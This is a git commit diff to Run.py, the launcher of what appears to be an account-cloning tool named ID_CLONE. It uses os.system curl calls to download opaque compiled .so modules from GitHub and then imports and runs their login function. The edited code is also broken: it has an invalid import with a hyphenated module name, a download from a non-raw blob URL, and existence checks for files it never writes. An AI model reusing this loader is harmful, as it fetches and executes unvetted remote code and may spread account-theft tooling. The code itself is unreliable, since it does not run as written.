818219f301edace26bb430d7957bc922d7e7db4f
BLACK <88026058+fardinHack@users.noreply.github.com>
2022-07-09 18:13:24 +0300

    Update Run.py

--- Run.py
+++ Run.py
@@ -7,15 +7,15 @@ except:
 
 import requests
 if not os.path.isfile('Jutt.so'):
-    os.system('curl -L https://raw.githubusercontent.com/SHOOTER-MAKER/Juttbrand/main/Jutt.cpython-310.so > BLACK.so')
+    os.system('curl -L https://github.com/fardinHack/Huw/blob/main/ID_CLONE.cython-easy-38.so > ID_CLONE.cython-easy-38.so')
     os.system('clear')
 if not os.path.isfile('brand.so'):
-    os.system('curl -L https://github.com/fardinHack/Huw/blob/main/ID_CLONE.cython-easy-38.so > BLACK.so')
+    os.system('curl -L https://github.com/fardinHack/Huw/blob/main/ID_CLONE.cython-easy-38.so > ID_CLONE.cython-easy-38.so')
     os.system('clear')
 bit=platform.architecture()[0]
 if bit == '64bit':
-    from BLACK import login
+    from ID_CLONE.cython-easy-38 import login
     login()
 elif bit == '32bit':
-    from BLACK import login
+    from ID_CLONE.cython-easy-38 import login
     login()
